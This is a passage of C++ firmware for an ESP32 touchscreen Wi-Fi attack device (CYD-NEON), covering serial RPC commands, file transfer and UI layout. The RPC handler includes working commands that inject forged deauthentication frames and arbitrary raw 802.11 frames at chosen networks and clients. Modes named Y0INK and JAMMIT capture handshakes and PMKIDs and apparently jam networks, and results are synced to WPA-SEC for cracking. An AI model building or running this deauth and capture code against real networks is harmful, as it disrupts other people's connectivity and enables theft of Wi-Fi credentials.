static const char* androidApkPath = "/CYDCompanion.apk";
static const char* wpasecResultsPath = "/wpasec_results.txt";
static const char* wpasecUploadedPath = "/wpasec_uploaded.txt";
static File androidApkUploadFile;
static bool sdUploadOk = false;
static String apSsid = "CYD_COMPANION";  // AP SSID when in AP mode
static String apPassword = "";          // AP password (empty = open)
static bool apMode = false;             // True when in AP mode
static bool wpasecSyncInProgress = false;  // WPA-SEC sync status
static String wpasecSyncStatus = "";   // WPA-SEC sync message
static uint16_t crackedNetworks = 0;    // Number of cracked networks
// Android Companion -> CYD visual indicator (shows during SD pulls)
static uint32_t companionSyncUntilMs = 0;
static bool companionSyncBadgeWasDrawn = false;
// USB serial RPC file transfer session (phone app over OTG cable)
static String usbDlToken = "";
static String usbDlPath = "";
static size_t usbDlSize = 0;

enum class RiskyWebAction : uint8_t {
  NONE = 0,
  START_SNIFF,
  AUTO_Y0INK,
  AUTO_RAW,
  AUTO_SCOPE,
  AUTO_JAMMIT
};

static RiskyWebAction pendingRiskyWebAction = RiskyWebAction::NONE;
static uint32_t pendingRiskyWebActionMs = 0;

// ---------- UI ----------
enum class ScreenId : uint8_t {
  HOME,
  JUST_GO,
  WIFI_SCAN,
  CONFIRM_TARGET,
  TARGET_DETAILS,
  AUTOMATE_MENU,
  MONITOR,
  RECON,
  TARGETS_PLACEHOLDER,
  CONFIG,
  WIFI_CONFIG,
  STARTUP_CONFIG,
  TELEMETRY_CONFIG,
  WIFI_CONNECT,
  WEBSERVER,
  ABOUT,
  BRUCE_MENU,
  BRUCE_MONITOR,
  BRUCE_SET_TARGET,
  SCOPE_GRAPH,
  LED_CONTROL,
};
static ScreenId screen = ScreenId::HOME;

static const char* screenToStr(ScreenId s) {
  switch (s) {
    case ScreenId::HOME: return "HOME";
    case ScreenId::JUST_GO: return "JUST_GO";
    case ScreenId::WIFI_SCAN: return "WIFI_SCAN";
    case ScreenId::CONFIRM_TARGET: return "CONFIRM_TARGET";
    case ScreenId::TARGET_DETAILS: return "TARGET_DETAILS";
    case ScreenId::AUTOMATE_MENU: return "AUTOMATE_MENU";
    case ScreenId::MONITOR: return "MONITOR";
    case ScreenId::TARGETS_PLACEHOLDER: return "TARGETS_PLACEHOLDER";
    case ScreenId::CONFIG: return "CONFIG";
    case ScreenId::WIFI_CONFIG: return "WIFI_CONFIG";
    case ScreenId::STARTUP_CONFIG: return "STARTUP_CONFIG";
    case ScreenId::TELEMETRY_CONFIG: return "TELEMETRY_CONFIG";
    case ScreenId::WIFI_CONNECT: return "WIFI_CONNECT";
    case ScreenId::WEBSERVER: return "WEBSERVER";
    case ScreenId::RECON: return "RECON";
    case ScreenId::ABOUT: return "ABOUT";
    case ScreenId::BRUCE_MENU: return "BRUCE_MENU";
    case ScreenId::BRUCE_MONITOR: return "BRUCE_MONITOR";
    case ScreenId::BRUCE_SET_TARGET: return "BRUCE_SET_TARGET";
    case ScreenId::SCOPE_GRAPH: return "SCOPE_GRAPH";
    case ScreenId::LED_CONTROL: return "LED_CONTROL";
    default: return "UNKNOWN";
  }
}

static void printRuntimeStatus() {
  Serial.printf(
    "[hb] screen=%s wifiScan=%d aps=%d sel=%d scroll=%d target=%d ssid='%s' ch=%d "
    "sniff=%d mode=%s lock=%d pps=%d pkts=%lu drop=%lu werr=%lu sd=%d dirty=%d\n",
    screenToStr(screen),
    wifiIsScanning ? 1 : 0,
    apCount, apSelected, apScroll,
    hasTarget ? 1 : 0,
    hasTarget ? target.ssid.c_str() : "-",
    hasTarget ? target.channel : -1,
    sniffActive ? 1 : 0,
    autoModeStr(autoMode),
    lockChannel ? 1 : 0,
    sniffPps,
    (unsigned long)sniffPacketCount,
    (unsigned long)sniffDroppedPackets,
    (unsigned long)sniffWriteErrors,
    sdReady ? 1 : 0,
    configDirty ? 1 : 0
  );
}

static void verboseHeartbeatTick() {
  // Periodic heartbeat disabled to keep serial console clean.
}

static String bytesToHex(const uint8_t* data, size_t len) {
  static const char* hex = "0123456789ABCDEF";
  String out;
  out.reserve(len * 2);
  for (size_t i = 0; i < len; i++) {
    uint8_t b = data[i];
    out += hex[(b >> 4) & 0x0F];
    out += hex[b & 0x0F];
  }
  return out;
}

static bool usbHexToBytes(const String& in, uint8_t* out, int maxLen, int& outLen) {
  outLen = 0;
  int n = in.length();
  if (n <= 0 || (n % 2) != 0) return false;
  if ((n / 2) > maxLen) return false;
  auto nib = [](char c) -> int {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return 10 + (c - 'a');
    if (c >= 'A' && c <= 'F') return 10 + (c - 'A');
    return -1;
  };
  for (int i = 0; i < n; i += 2) {
    int hi = nib(in[i]);
    int lo = nib(in[i + 1]);
    if (hi < 0 || lo < 0) return false;
    out[outLen++] = (uint8_t)((hi << 4) | lo);
  }
  return true;
}

static void fillStatusJson(JsonDocument& doc) {
  doc["ok"] = true;
  doc["name"] = "CYD-NEON";
  doc["mode"] = (int)screen;
  doc["autoMode"] = autoModeStr(autoMode);
  doc["sniffActive"] = sniffActive;
  doc["lockChannel"] = lockChannel;
  doc["apMode"] = apMode;
  doc["webServer"] = webServerRunning;
  doc["sdReady"] = sdReady;
  doc["packets"] = sniffPacketCount;
  doc["beacons"] = monBeaconHits;
  doc["handshakes"] = monHandshakeHits;
  doc["ip_sta"] = WiFi.localIP().toString();
  doc["ip_ap"] = WiFi.softAPIP().toString();
  if (autoMode == AutoMode::Y0INK && YoinkEngine::isRunning()) {
    JsonObject yoink = doc["yoink"].to<JsonObject>();
    yoink["state"] = YoinkEngine::getStateStr();
    yoink["hs"] = YoinkEngine::getHandshakeCount();
    yoink["pmkid"] = YoinkEngine::getPmkidCount();
    yoink["nets"] = YoinkEngine::getNetworkCount();
    yoink["deauths"] = YoinkEngine::getDeauthCount();
    yoink["target"] = YoinkEngine::getTargetSSID();
  }
}

static void fillConsoleJson(JsonDocument& doc, uint32_t since, int limit) {
  if (limit < 1) limit = 1;
  if (limit > 200) limit = 200;
  doc["ok"] = true;
  doc["next_seq"] = consoleSeq + 1;
  JsonArray lines = doc["lines"].to<JsonArray>();
  uint16_t emitted = 0;
  for (uint16_t i = 0; i < CONSOLE_RING_SIZE && emitted < (uint16_t)limit; i++) {
    const ConsoleEvent& e = consoleRing[(consoleHead + i) % CONSOLE_RING_SIZE];
    if (e.seq == 0 || e.seq <= since) continue;
    JsonObject o = lines.add<JsonObject>();
    o["seq"] = e.seq;
    o["ms"] = e.ms;
    o["level"] = e.level;
    o["tag"] = e.tag;
    o["msg"] = e.msg;
    emitted++;
  }
}

static void fillPacketsJson(JsonDocument& doc, uint32_t since, int limit) {
  if (limit < 1) limit = 1;
  if (limit > 260) limit = 260;
  doc["ok"] = true;
  JsonArray lines = doc["lines"].to<JsonArray>();
  portENTER_CRITICAL(&packetRingMux);
  uint16_t emitted = 0;
  for (uint16_t i = 0; i < PACKET_RING_SIZE && emitted < (uint16_t)limit; i++) {
    const PacketEvent& p = packetRing[(packetHead + i) % PACKET_RING_SIZE];
    if (p.seq == 0 || p.seq <= since) continue;
    char src[18], dst[18], bssid[18];
    macToStr(p.addr2, src);
    macToStr(p.addr1, dst);
    macToStr(p.addr3, bssid);
    JsonObject o = lines.add<JsonObject>();
    o["seq"] = p.seq;
    o["ms"] = p.ms;
    o["type"] = p.type;
    o["subtype"] = p.subtype;
    o["len"] = p.len;
    o["rssi"] = p.rssi;
    o["ch"] = p.channel;
    o["src"] = src;
    o["dst"] = dst;
    o["bssid"] = bssid;
    emitted++;
  }
  doc["next_seq"] = packetSeq + 1;
  portEXIT_CRITICAL(&packetRingMux);
}

static void usbRpcSendJson(uint32_t id, JsonDocument& doc) {
  doc["id"] = id;
  String out;
  serializeJson(doc, out);
  Serial.println(out);
}

static void usbRpcSendError(uint32_t id, const char* err) {
  JsonDocument doc;
  doc["ok"] = false;
  doc["error"] = err ? err : "error";
  usbRpcSendJson(id, doc);
}

static void handleSerialRpcLine(const String& lineRaw) {
  String line = lineRaw;
  line.trim();
  if (line.isEmpty()) return;

  // Keep existing single-key debug behavior.
  if (line.length() == 1) {
    char c = (char)tolower(line[0]);
    if (c == 'v') {
      verboseSerial = !verboseSerial;
      Serial.printf("[dbg] verbose=%s\n", verboseSerial ? "ON" : "OFF");
      if (verboseSerial) printRuntimeStatus();
      return;
    }
    if (c == 's') {
      printRuntimeStatus();
      return;
    }
  }

  if (!line.startsWith("{")) return;

  JsonDocument req;
  DeserializationError derr = deserializeJson(req, line);
  if (derr) return;

  uint32_t id = req["id"] | 0;
  String cmd = req["cmd"] | "";
  cmd.toLowerCase();
  if (cmd.isEmpty()) {
    usbRpcSendError(id, "missing cmd");
    return;
  }

  if (cmd == "status") {
    JsonDocument doc;
    fillStatusJson(doc);
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "console") {
    uint32_t since = req["since"] | 0;
    int limit = req["limit"] | 80;
    JsonDocument doc;
    fillConsoleJson(doc, since, limit);
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "packets") {
    uint32_t since = req["since"] | 0;
    int limit = req["limit"] | 120;
    JsonDocument doc;
    fillPacketsJson(doc, since, limit);
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "list") {
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      usbRpcSendError(id, "sd unavailable");
      return;
    }
    String path = normalizeSdWebPath((const char*)(req["path"] | "/"));
    if (path.isEmpty()) {
      usbRpcSendError(id, "invalid path");
      return;
    }
    if (!SD.exists(path)) {
      usbRpcSendError(id, "path not found");
      return;
    }
    File dir = SD.open(path, FILE_READ);
    if (!dir || !dir.isDirectory()) {
      if (dir) dir.close();
      usbRpcSendError(id, "not a directory");
      return;
    }
    JsonDocument doc;
    doc["ok"] = true;
    doc["path"] = path;
    JsonArray items = doc["items"].to<JsonArray>();
    while (true) {
      File entry = dir.openNextFile();
      if (!entry) break;
      String fullPath = entry.name();
      if (!fullPath.startsWith("/")) {
        fullPath = path;
        if (!fullPath.endsWith("/")) fullPath += "/";
        fullPath += entry.name();
      }
      String baseName = fullPath.substring(fullPath.lastIndexOf('/') + 1);
      bool isDir = entry.isDirectory();
      uint32_t size = (uint32_t)entry.size();
      entry.close();
      JsonObject o = items.add<JsonObject>();
      o["name"] = baseName;
      o["path"] = fullPath;
      o["dir"] = isDir;
      o["size"] = size;
    }
    dir.close();
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "download_begin") {
    bool sdOk = sdReady || mountSdCard(false);
    if (!sdOk) {
      usbRpcSendError(id, "sd unavailable");
      return;
    }
    String path = normalizeSdWebPath((const char*)(req["path"] | "/"));
    if (path.isEmpty() || path == "/") {
      usbRpcSendError(id, "invalid path");
      return;
    }
    if (!SD.exists(path)) {
      usbRpcSendError(id, "file not found");
      return;
    }
    File f = SD.open(path, FILE_READ);
    if (!f || f.isDirectory()) {
      if (f) f.close();
      usbRpcSendError(id, "not a file");
      return;
    }
    usbDlPath = path;
    usbDlSize = (size_t)f.size();
    usbDlToken = String((uint32_t)millis(), HEX) + String((uint32_t)esp_random(), HEX);
    f.close();
    JsonDocument doc;
    doc["ok"] = true;
    doc["token"] = usbDlToken;
    doc["size"] = (uint32_t)usbDlSize;
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "download_chunk") {
    String token = (const char*)(req["token"] | "");
    if (token.isEmpty() || token != usbDlToken || usbDlPath.isEmpty()) {
      usbRpcSendError(id, "invalid token");
      return;
    }
    size_t offset = (size_t)((uint32_t)(req["offset"] | 0));
    int maxBytes = req["max"] | 192;
    if (maxBytes < 32) maxBytes = 32;
    if (maxBytes > 512) maxBytes = 512;
    if (offset > usbDlSize) offset = usbDlSize;

    File f = SD.open(usbDlPath, FILE_READ);
    if (!f) {
      usbRpcSendError(id, "open failed");
      return;
    }
    if (!f.seek(offset)) {
      f.close();
      usbRpcSendError(id, "seek failed");
      return;
    }
    uint8_t buf[512];
    int n = f.read(buf, maxBytes);
    f.close();
    if (n < 0) n = 0;
    size_t nextOffset = offset + (size_t)n;
    bool eof = (nextOffset >= usbDlSize);
    JsonDocument doc;
    doc["ok"] = true;
    doc["offset"] = (uint32_t)offset;
    doc["eof"] = eof;
    doc["hex"] = bytesToHex(buf, (size_t)n);
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "download_end") {
    String token = (const char*)(req["token"] | "");
    if (token == usbDlToken) {
      usbDlToken = "";
      usbDlPath = "";
      usbDlSize = 0;
    }
    JsonDocument doc;
    doc["ok"] = true;
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "control") {
    String name = (const char*)(req["name"] | "");
    name.toUpperCase();
    JsonDocument doc;
    doc["ok"] = true;
    if (name == "PING") {
      doc["msg"] = "pong";
    } else if (name == "SET_BRIGHT") {
      int v = req["val"] | 255;
      if (v < 0) v = 0;
      if (v > 255) v = 255;
      applyBacklightLevel((uint8_t)v);
      doc["val"] = v;
    } else if (name == "SET_CONFIG") {
      String key = (const char*)(req["key"] | "");
      if (key == "wifi_enableDeauth") {
        cfg.wifi_enableDeauth = req["val"] | false;
        configDirty = true;
        doc["val"] = cfg.wifi_enableDeauth;
      } else {
        doc["ok"] = false;
        doc["error"] = "unknown config key";
      }
    } else if (name == "SET_MODE") {
      String mode = (const char*)(req["mode"] | "");
      mode.toUpperCase();
      if (mode == "NONE") {
        disengageAutoMode();
      } else if (mode == "Y0INK") {
        engageAutoMode(AutoMode::Y0INK);
      } else if (mode == "RAW") {
        engageAutoMode(AutoMode::RAW);
      } else if (mode == "SCOPE") {
        engageAutoMode(AutoMode::SCOPE);
      } else if (mode == "JAMMIT") {
        engageAutoMode(AutoMode::JAMMIT);
      } else {
        doc["ok"] = false;
        doc["error"] = "unknown mode";
      }
      doc["autoMode"] = autoModeStr(autoMode);
    } else if (name == "SET_WIFI") {
      String mode = (const char*)(req["mode"] | "");
      mode.toUpperCase();
      if (mode == "WIFI_OFF") {
        if (apMode) startAPMode();
        WiFi.mode(WIFI_OFF);
      } else if (mode == "WIFI_STA") {
        if (apMode) startAPMode();
        WiFi.mode(WIFI_STA);
      } else if (mode == "WIFI_AP") {
        if (!apMode) startAPMode();
      } else if (mode == "WIFI_AP_STA") {
        WiFi.mode(WIFI_AP_STA);
      } else {
        doc["ok"] = false;
        doc["error"] = "unknown wifi mode";
      }
      doc["mode"] = mode;
    } else {
      doc["ok"] = false;
      doc["error"] = "unknown control";
    }
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "ai_frames") {
    JsonDocument doc;
    doc["ok"] = false;
    doc["error"] = "usb ai_frames not implemented";
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "ai_inject_raw") {
    JsonDocument doc;
    String hex = (const char*)(req["frame"] | "");
    int channel = req["channel"] | 1;
    uint8_t payload[900];
    int payloadLen = 0;
    if (!usbHexToBytes(hex, payload, sizeof(payload), payloadLen) || payloadLen <= 0) {
      doc["ok"] = false;
      doc["error"] = "invalid frame hex";
      usbRpcSendJson(id, doc);
      return;
    }
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    esp_err_t tx = esp_wifi_80211_tx(WIFI_IF_STA, payload, payloadLen, false);
    doc["ok"] = (tx == ESP_OK);
    doc["err"] = (int)tx;
    usbRpcSendJson(id, doc);
    return;
  }

  if (cmd == "ai_inject_deauth") {
    JsonDocument doc;
    String bssidStr = (const char*)(req["bssid"] | "");
    String clientStr = (const char*)(req["client"] | "FF:FF:FF:FF:FF:FF");
    int reason = req["reason"] | 7;
    int count = req["count"] | 5;
    int channel = req["channel"] | 1;
    uint8_t bssid[6], client[6];
    if (!macFromString(bssidStr.c_str(), bssid) || !macFromString(clientStr.c_str(), client)) {
      doc["ok"] = false;
      doc["error"] = "invalid mac";
      usbRpcSendJson(id, doc);
      return;
    }
    if (count < 1) count = 1;
    if (count > 20) count = 20;
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    int sent = 0;
    for (int i = 0; i < count; i++) {
      sendDeauthFrame(bssid, client, (uint8_t)reason);
      sent++;
      delay(2);
    }
    doc["ok"] = true;
    doc["sent"] = sent;
    usbRpcSendJson(id, doc);
    return;
  }

  usbRpcSendError(id, "unknown cmd");
}

static void handleSerialDebugCommands() {
  static String serialLine;
  while (Serial.available() > 0) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (!serialLine.isEmpty()) {
        handleSerialRpcLine(serialLine);
        serialLine = "";
      }
      continue;
    }
    if (serialLine.length() < 2048) {
      serialLine += c;
    }
  }
}

struct Button { int x, y, w, h; const char* label; };
#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static constexpr int HYPERCUBE_UI_SCALE = 2;
#else
static constexpr int HYPERCUBE_UI_SCALE = 4;
#endif
static constexpr int HYPERCUBE_BASE_SIZE_PX = 24;
static constexpr int HYPERCUBE_TARGET_SIZE_PX = HYPERCUBE_BASE_SIZE_PX * HYPERCUBE_UI_SCALE;
#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static constexpr int UI_TOP_BUTTON_SHIFT_Y = 0;
static constexpr int UI_TOP_BUTTON_SHIFT_THRESHOLD_Y = 0;
#else
static constexpr int UI_TOP_BUTTON_SHIFT_Y = 34;
static constexpr int UI_TOP_BUTTON_SHIFT_THRESHOLD_Y = 72;
#endif

static inline int buttonRenderYOffset(const Button& b) {
  // Keep existing logical layouts, but move top rows below the enlarged hypercube.
  return (b.y <= UI_TOP_BUTTON_SHIFT_THRESHOLD_Y) ? UI_TOP_BUTTON_SHIFT_Y : 0;
}

static bool hit(const Button& b, int px, int py) {
  const int yOff = buttonRenderYOffset(b);
  const int by = b.y + yOff;
  return (px >= b.x && px < (b.x + b.w) && py >= by && py < (by + b.h));
}

// home‑screen geometry constants
static constexpr int HOME_BTN_COLS = 3;
static constexpr int HOME_BTN_ROWS = 3;
static constexpr int HOME_BTN_COUNT = 8;
#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static constexpr uint8_t UI_BUTTON_TEXT_SIZE = 1;
#else
static constexpr uint8_t UI_BUTTON_TEXT_SIZE = 2;
#endif

// utility for picking neon border colour; indexed same order as labels below.
static uint16_t homeBtnBorderColor(int idx) {
  // neon palette for 8 home buttons
  static const uint16_t colours[HOME_BTN_COUNT] = {
    0x07E0, 0xF81F, 0x00FF,
    0xFFE0, 0x001F, 0x0FF0,
    0x07FF, 0xFD20
  };
  return colours[idx % HOME_BTN_COUNT];
}

static void drawButton(const Button& b, uint16_t fill, uint16_t border, uint16_t text) {
  const int yOff = buttonRenderYOffset(b);
  // Render button at ~95% of logical hitbox size for better text fit.
  const int drawW = (b.w * 95) / 100;
  const int drawH = (b.h * 95) / 100;
  const int drawX = b.x + (b.w - drawW) / 2;
  const int drawY = (b.y + yOff) + (b.h - drawH) / 2;
  const int r = (drawH >= 28) ? 8 : 6;

  tft.fillRoundRect(drawX, drawY, drawW, drawH, r, fill);
  tft.drawRoundRect(drawX, drawY, drawW, drawH, r, border);
  tft.setTextDatum(MC_DATUM);
  tft.setTextColor(text, fill);

  // Keep labels inside button bounds; shrink only when needed.
  int labelSize = UI_BUTTON_TEXT_SIZE;
  tft.setTextSize(labelSize);
  while (labelSize > 1 && tft.textWidth(b.label) > (drawW - 10)) {
    labelSize--;
    tft.setTextSize(labelSize);
  }
  tft.drawString(b.label, b.x + b.w / 2, (b.y + yOff) + b.h / 2);
}

static int hypercubeBoxX = 0;
static int hypercubeBoxY = 2;
static int hypercubeBoxW = 24;
static int hypercubeBoxH = 24;
static int hypercubeReservedBottomY = 34;
static const char* currentHeaderTitle = nullptr;
static void layoutHypercubeBox();

// ---------- Shared UI Layout System ----------
#ifndef UI_DEBUG
#define UI_DEBUG 0
#endif

#if UI_DEBUG
#define UI_LOGF(...) Serial.printf(__VA_ARGS__)
#else
#define UI_LOGF(...) do {} while (0)
#endif

#ifndef UI_DEBUG_MEM
#define UI_DEBUG_MEM 0
#endif

#ifndef MEM_BUDGET_MIN_FREE_HEAP
#define MEM_BUDGET_MIN_FREE_HEAP (40U * 1024U)
#endif

#if UI_DEBUG_MEM
extern "C" {
  extern uint8_t _data_start;
  extern uint8_t _data_end;
  extern uint8_t _bss_start;
  extern uint8_t _bss_end;
}

static void uiMemLog(const char* tag) {
  const uint32_t free8 = (uint32_t)heap_caps_get_free_size(MALLOC_CAP_8BIT);
  const uint32_t largest8 = (uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
  const uint32_t freeHeap = (uint32_t)ESP.getFreeHeap();
  const uint32_t heapSize = (uint32_t)ESP.getHeapSize();
  const uint32_t sketchSize = (uint32_t)ESP.getSketchSize();
  const uint32_t freeSketch = (uint32_t)ESP.getFreeSketchSpace();
  Serial.printf("[mem] %s free8=%lu largest8=%lu freeHeap=%lu heapSize=%lu sketch=%lu freeSketch=%lu",
                tag ? tag : "(null)",
                (unsigned long)free8,
                (unsigned long)largest8,
                (unsigned long)freeHeap,
                (unsigned long)heapSize,
                (unsigned long)sketchSize,
                (unsigned long)freeSketch);
#if defined(BOARD_HAS_PSRAM) && BOARD_HAS_PSRAM
  if (psramFound()) {
    Serial.printf(" psramFree=%lu psramSize=%lu",
                  (unsigned long)ESP.getFreePsram(),
                  (unsigned long)ESP.getPsramSize());
  } else {
    Serial.print(" psram=absent");
  }
#else
  Serial.print(" psram=disabled");
#endif
  Serial.println();
}

static void uiMemBudgetBoot() {
  const uint32_t dataBytes = (uint32_t)(&_data_end - &_data_start);
  const uint32_t bssBytes = (uint32_t)(&_bss_end - &_bss_start);
  const uint32_t staticBytes = dataBytes + bssBytes;
  const uint32_t free8 = (uint32_t)heap_caps_get_free_size(MALLOC_CAP_8BIT);
  const uint32_t largest8 = (uint32_t)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
  Serial.printf("[mem-budget] free8=%lu largest8=%lu data=%lu bss=%lu static=%lu min_safe=%lu\n",
                (unsigned long)free8,
                (unsigned long)largest8,
                (unsigned long)dataBytes,
                (unsigned long)bssBytes,
                (unsigned long)staticBytes,
                (unsigned long)MEM_BUDGET_MIN_FREE_HEAP);
  if (free8 < MEM_BUDGET_MIN_FREE_HEAP) {
    Serial.printf("[mem-budget][WARN] free8=%lu below threshold=%lu\n",
                  (unsigned long)free8,
                  (unsigned long)MEM_BUDGET_MIN_FREE_HEAP);
  }
}
#else
static inline void uiMemLog(const char*) {}
static inline void uiMemBudgetBoot() {}
#endif

#if defined(NEONDRIVE_TARGET_BUTTON_NAV)
static constexpr int UI_SAFE_MARGIN = 4;
static constexpr int UI_TOP_GAP = 4;
static constexpr int UI_BOTTOM_BAR_H = 30;
static constexpr int UI_BUTTON_H = 24;
static constexpr int UI_BUTTON_GAP = 4;
#else
static constexpr int UI_SAFE_MARGIN = 8;
static constexpr int UI_TOP_GAP = 6;
static constexpr int UI_BOTTOM_BAR_H = 36;
static constexpr int UI_BUTTON_H = 30;
static constexpr int UI_BUTTON_GAP = 6;
#endif
static void drawCyberBackdrop();
static void drawHypercubeWidget(bool clearBg);

struct UiRect {
  int x;
  int y;
  int w;
  int h;
};

static inline int uiScreenW() { return tft.width(); }
static inline int uiScreenH() { return tft.height(); }
static inline int uiTopBarH() { return hypercubeReservedBottomY; }

static UiRect computeBottomBarRect() {
  const int w = uiScreenW();
  const int h = uiScreenH();
  UiRect r{UI_SAFE_MARGIN, h - UI_BOTTOM_BAR_H, w - (UI_SAFE_MARGIN * 2), UI_BOTTOM_BAR_H};
  return r;
}

static UiRect computeContentRect() {
  const int w = uiScreenW();
  UiRect bar = computeBottomBarRect();
  const int y0 = uiTopBarH() + UI_TOP_GAP;
  UiRect r{UI_SAFE_MARGIN, y0, w - (UI_SAFE_MARGIN * 2), (bar.y - UI_TOP_GAP) - y0};
  if (r.h < 0) r.h = 0;
  return r;
}

static bool pointInRect(int px, int py, const UiRect& r) {
  return (px >= r.x && px < (r.x + r.w) && py >= r.y && py < (r.y + r.h));
}

static UiRect buttonRect(const Button& b) {
  return UiRect{b.x, b.y, b.w, b.h};
}

static void layoutBottomButtons(Button* out, const char* const* labels, int count) {
  UiRect bar = computeBottomBarRect();
  if (!out || !labels || count <= 0) return;
  const int totalGap = UI_BUTTON_GAP * (count - 1);
  const int btnW = (bar.w - totalGap) / count;
  for (int i = 0; i < count; i++) {
    out[i] = {bar.x + i * (btnW + UI_BUTTON_GAP), bar.y, btnW, UI_BUTTON_H, labels[i]};
  }
}

static void drawUniversalBackground() {
  drawCyberBackdrop();
}

static void drawHypercuberAnchorTopRight() {
  drawHypercubeWidget(false);
}

static void uiLogLayout(const char* tag, const UiRect& content, const UiRect& bottom) {
  UI_LOGF("[ui] %s screen=%s w=%d h=%d content=(%d,%d,%d,%d) bottom=(%d,%d,%d,%d) hypercube=(%d,%d,%d,%d)\n",
          tag ? tag : "layout",
          screenToStr(screen),
          uiScreenW(), uiScreenH(),
          content.x, content.y, content.w, content.h,
          bottom.x, bottom.y, bottom.w, bottom.h,
          hypercubeBoxX, hypercubeBoxY, hypercubeBoxW, hypercubeBoxH);
}

static void uiLogButtonRect(const char* label, const Button& b) {
  UI_LOGF("[ui] btn '%s' rect=(%d,%d,%d,%d)\n",
          label ? label : "(null)", b.x, b.y, b.w, b.h);
}

static void drawHeaderTitleOverlay() {
  if (!currentHeaderTitle || currentHeaderTitle[0] == '\0') return;
  layoutHypercubeBox();
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize((tft.height() <= 180) ? 1 : 2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  String headerTitle = String(currentHeaderTitle);
  const int maxTitleW = (hypercubeBoxX - 12) - 8;
  if (maxTitleW > 8) {
    while (headerTitle.length() > 3 && tft.textWidth(headerTitle) > maxTitleW) {
      headerTitle.remove(headerTitle.length() - 1);
    }
    if (headerTitle != String(currentHeaderTitle) && headerTitle.length() > 3) {
      headerTitle.remove(headerTitle.length() - 3);
      headerTitle += "...";
    }
  }
  tft.drawString(headerTitle, 8, 8);
}

static void drawHeader(const char* title) {
  layoutHypercubeBox();
  currentHeaderTitle = title;
  tft.fillRect(0, 0, tft.width(), hypercubeReservedBottomY, TFT_BLACK);
  drawHeaderTitleOverlay();

  // Companion Sync badge (may be cleared/redrawn elsewhere; draw once on header paints too)
  // Keep it subtle and non-invasive in the header region.
  const uint32_t now = millis();
  const bool companionActive = (companionSyncUntilMs != 0) && ((int32_t)(companionSyncUntilMs - now) > 0);
  const int badgeX = 8;
  const int badgeY = hypercubeReservedBottomY - 14;
  const int badgeH = 12;
  const int badgeMaxW = (hypercubeBoxX - 12) - badgeX;
  const int badgeW = (badgeMaxW > 150) ? 150 : badgeMaxW;
  if (badgeW > 60) {
    if (companionActive) {
      tft.fillRoundRect(badgeX, badgeY, badgeW, badgeH, 3, TFT_DARKGREY);
      tft.drawRoundRect(badgeX, badgeY, badgeW, badgeH, 3, TFT_MAGENTA);
      tft.setTextDatum(TL_DATUM);
      tft.setTextSize(1);
      tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
      tft.drawString("Companion Sync", badgeX + 6, badgeY + 2);
      companionSyncBadgeWasDrawn = true;
    } else if (companionSyncBadgeWasDrawn) {
      tft.fillRect(badgeX, badgeY, badgeW, badgeH, TFT_BLACK);
      companionSyncBadgeWasDrawn = false;
    }
  }

  drawBorder();
}

static void drawCompanionSyncBadgeTick() {
  const uint32_t now = millis();
  const bool companionActive = (companionSyncUntilMs != 0) && ((int32_t)(companionSyncUntilMs - now) > 0);

  layoutHypercubeBox();
  const int badgeX = 8;
  const int badgeY = hypercubeReservedBottomY - 14;
  const int badgeH = 12;
  const int badgeMaxW = (hypercubeBoxX - 12) - badgeX;
  const int badgeW = (badgeMaxW > 150) ? 150 : badgeMaxW;
  if (badgeW <= 60) return;

  if (companionActive) {
    tft.fillRoundRect(badgeX, badgeY, badgeW, badgeH, 3, TFT_DARKGREY);
    tft.drawRoundRect(badgeX, badgeY, badgeW, badgeH, 3, TFT_MAGENTA);
    tft.setTextDatum(TL_DATUM);
    tft.setTextSize(1);
    tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
    tft.drawString("Companion Sync", badgeX + 6, badgeY + 2);
    companionSyncBadgeWasDrawn = true;
  } else if (companionSyncBadgeWasDrawn) {
    tft.fillRect(badgeX, badgeY, badgeW, badgeH, TFT_BLACK);
    companionSyncBadgeWasDrawn = false;
  }
}

static Button homeBtns[HOME_BTN_COUNT];

// ---------- Home -> Targets smart flow (Milestone D v6) ----------
static bool homeTargetsPromptActive = false;
static bool homeReconnectPromptActive = false;
static Button btnHomePromptYes, btnHomePromptNo;

static Button btnBack, btnSave;

static Button btnWifiBack, btnWifiScan, btnWifiStop;
static Button btnWifiUp, btnWifiDown;
static Button btnWifiYes, btnWifiNo;
static Button btnTargetBack, btnTargetAutomate, btnTargetMonitor, btnTargetSniff, btnTargetLock;
static Button btnMonitorBack;
static Button btnAutoBack, btnAutoY0INK, btnAutoRAW, btnAutoSCOPE, btnAutoJAMMIT;
static Button btnMonitorUpDir, btnMonitorUp, btnMonitorDown;
// Just Go screen buttons
static Button btnJustGoBack, btnJustGoToggle, btnJustGoSpray;
static Button btnJustGoStayMinus, btnJustGoStayPlus;
static Button btnJustGoProfilePrev, btnJustGoProfileNext;

// WiFi Connect screen buttons
static Button btnWifiConnectBack, btnWifiConnectList[MAX_APS];
static Button btnWifiConnectScan, btnWifiConnectUp, btnWifiConnectDown;
static Button btnWifiConnectSubmit, btnWifiConnectDisconnect;
static Button btnWifiPwKeys[40];
static char wifiPwKeyLabels[40][2];
static char wifiPwKeyValues[40];
static int wifiPwKeyCount = 0;
static bool wifiPwShift = false;
static Button btnWifiPwShift;
static Button btnWifiPwBack;
static Button btnWifiPwSpace;
